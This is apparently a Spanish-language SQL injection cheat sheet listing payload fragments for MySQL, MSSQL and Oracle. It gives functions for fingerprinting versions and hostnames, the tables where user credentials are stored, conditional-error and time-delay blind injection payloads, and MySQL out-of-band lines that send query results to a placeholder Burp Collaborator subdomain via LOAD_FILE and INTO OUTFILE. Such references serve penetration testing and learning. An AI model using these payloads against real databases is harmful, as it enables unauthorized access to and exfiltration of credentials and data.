# Inyecciones por DDBB

## MySQL

### DDBB por defecto

```
mysql 
information_schema
```

### Version de DDBB

```
VERSION()
@@VERSION
@@GLOBAL.VERSION
```

### Credenciales por defecto

```
en tabla mysql.user, en las columnas user y password
```

### DDBB actual

```
database()
schema()
```

### Server Hostname

```
@@HOSTNAME
```

### String Concatenation
```
'hercu' 'les'
CONCAT('hercu','les')
```

### Substring
```
SUBSTRING('hercules', 4, 2)
```

### Comentarios
```
#comentario
-- comentario
/*comentario*/
```

### Listar tablas y columnas de una DDBB
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.tables WHERE table_name = 'tabla1'
```

### Errores condicionales
```
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 
```

### Uniendo querys
```
QUERY-1-HERE; QUERY-2-HERE 
```

### Time delay
```
SELECT sleep(10) 
```

### Time delay condicionales
```
SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') 
```

### DNS Lookup
```
LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')
SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'

# DNS Lookup con exfiltracion de datos
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a' 
```

## MSSQL

### DDBB por defecto

```
Model
Msdb
Tempdb
Northwind
Information_schema
```

### Version de DDBB

```
@@VERSION
```

### Credenciales por defecto

```
En 2 tablas:
master..syslogins
master..sysprocesses
en las columas name y loginame
```

### DDBB actual

```
db_name()
```

### Server Hostname

```
@@SERVERNAME
SERVERPROPERTY()
```

## Oracle

### DDBB por defecto

```
System
Sysaux
```

### Version de DDBB

```
VERSION
```

### Credenciales por defecto

```
En las tablas:
all_users
sys.user$
En las columnas username, name y password
```

### DDBB actual

```
global_name
name
instance_name
SYS.DATABASE_NAME
```

### Server Hostname

```
host_name
UTL_INADDR.get_host_name
```
